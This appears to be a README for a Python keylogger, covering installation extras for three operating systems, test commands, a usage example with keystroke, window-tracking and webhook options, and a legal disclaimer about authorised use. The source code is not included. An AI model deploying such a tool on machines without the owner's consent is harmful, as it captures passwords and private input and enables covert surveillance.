

## Installation Instructions

### Option 1: Standard Installation
```bash
pip install -e .
```

### Option 2: With Windows Dependencies
```bash
pip install -e ".[windows]"
```

### Option 3: With macOS Dependencies
```bash
pip install -e ".[macos]"
```

### Option 4: With Linux Dependencies
```bash
pip install -e ".[linux]"
```

### Option 5: Full Development Setup
```bash
pip install -e ".[dev,windows,macos,linux]"
```

---

## Running Tests

```bash
# Run all tests
python test_keylogger.py

# Or with pytest
pytest test_keylogger.py -v

# With coverage
pytest test_keylogger.py --cov=keylogger
```

---

## Usage Example

```python
from pathlib import Path
from pynput.keyboard import Key
from keylogger import Keylogger, KeyloggerConfig

# Create config
config = KeyloggerConfig(
    log_dir=Path.home() / ".keylogger_logs",
    max_log_size_mb=5.0,
    webhook_url=None,
    toggle_key=Key.f9,
    enable_window_tracking=True,
    log_special_keys=True
)

# Create and start keylogger
keylogger = Keylogger(config)
keylogger.start()
```

---

## Legal Notice

⚠️ **DISCLAIMER:**
- This keylogger is for **educational and authorized security testing only**
- Unauthorized use of keyloggers is **ILLEGAL**
- Only use on systems you own or have explicit written permission to monitor
- Users are **fully responsible** for compliance with local laws

---

